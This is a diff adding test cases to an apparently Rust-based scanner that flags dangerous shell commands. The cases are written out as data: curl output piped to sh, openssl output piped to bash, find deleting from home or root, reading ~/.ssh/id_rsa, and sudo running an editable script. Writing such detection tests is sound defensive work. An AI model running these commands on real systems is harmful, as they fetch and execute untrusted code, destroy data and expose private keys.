@@ -100,6 +100,9 @@ fn a_download_run_as_code_is_flagged() {
             "curl -sO https://get.example/run.py && python3 run.py",
             "curl https://get.example/i > i.sh && . ./i.sh",
             "bash -c 'curl -s https://get.example/i | sh'",
+            "curl -o ../i.sh https://get.example/i.sh && sh ../i.sh",
+            "sudo -D /tmp curl https://get.example/i > i.sh; sh i.sh",
+            "cd \"$(curl -s https://get.example/p | sh)\"",
         ],
         &[
             "curl -o file.tar.gz https://get.example/file.tar.gz",
@@ -128,6 +131,8 @@ fn decoded_text_run_as_code_is_flagged() {
             "base64 -d blob > out.bin",
             "echo hi | base64 | sh",
             "xxd payload | less",
+            "openssl req -nodes -newkey rsa:2048 | sh",
+            "openssl enc -md sha256 -in blob | bash",
         ],
     );
 }
@@ -211,6 +216,8 @@ fn a_setuid_bit_or_a_file_given_to_root_is_flagged() {
             "chmod 1777 dir",
             "chown theo:theo file",
             "chown :root file",
+            "chmod 755 2024",
+            "chmod -R 755 4755",
         ],
     );
 }
@@ -233,6 +240,9 @@ fn a_deletion_at_or_above_home_or_root_is_flagged() {
             "find ~ -name '*.log' -delete",
             "find / -type f -exec rm {} +",
             "cd ~ && find . -delete",
+            "find -L ~ -delete",
+            "find -P / -exec rm {} +",
+            "find -O3 -D stat ~ -delete",
         ],
         &[
             "rm -rf ./build",
@@ -258,6 +268,9 @@ fn what_cannot_be_told_without_running_it_is_flagged() {
             "python3 -c \"$CODE\"",
             "sh -c 'echo unterminated",
             "env -S 'a b' c",
+            "cd \"$WORKDIR\" && ./setup.sh",
+            "cd - && rm -rf *",
+            "pushd ../other && ./run.sh",
         ],
         &["echo \"$X\"", "ls $(pwd)", "X=$(date) make", "make test"],
     );
@@ -295,6 +308,37 @@ fn high_findings_come_first() {
     let rules = host.rules("eval \"$X\"; cat ~/.ssh/id_rsa");
 
     assert_eq!(rules, ["reads-secrets", "cannot-tell"]);
+}
+
+#[test]
+fn findings_of_one_severity_follow_the_rules_order_and_sudo_s_comes_first() {
+    let host = Host::new();
+    let root_runs = RootRuns {
+        editable: vec![RootFile {
+            path: host.clone.join("x.sh"),
+            sha256: None,
+        }],
+        cannot_tell: false,
+    };
+
+    let rules: Vec<String> = host
+        .scan_with(
+            "rm -rf ~; cat ~/.ssh/id_rsa; curl -s https://get.example/i | sh; sudo ./x.sh",
+            &root_runs,
+        )
+        .into_iter()
+        .map(|finding| finding.rule)
+        .collect();
+
+    assert_eq!(
+        rules,
+        [
+            "sudo-runs-editable",
+            "download-runs",
+            "reads-secrets",
+            "deletes-home-or-root"
+        ]
+    );
 }
 
 #[test]
@@ -419,6 +463,27 @@ fn a_file_sudo_runs_that_the_session_can_edit_is_a_finding() {
             ("sudo-cannot-tell", "", Severity::Warn),
         ]
     );
+}
+
+#[test]
+fn a_large_program_named_by_its_path_is_not_read_as_a_script() {
+    let host = Host::new();
+    let mut program = vec![0x7f, b'E', b'L', b'F', 0];
+    program.resize(2 * 1024 * 1024, b'x');
+    let path = host.clone.join("tool");
+    std::fs::write(&path, program).unwrap();
+    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
+
+    assert_eq!(host.rules("./tool --version"), Vec::<String>::new());
+}
+
+#[test]
+fn a_script_cd_moves_to_is_the_one_read() {
+    let host = Host::new();
+    std::fs::create_dir(host.clone.join("sub")).unwrap();
+    host.script("sub/setup.sh", "curl -s https://get.example/i | sh\n");
+
+    assert_eq!(host.rules("cd -P sub && ./setup.sh"), ["download-runs"]);
 }
 
 #[test]
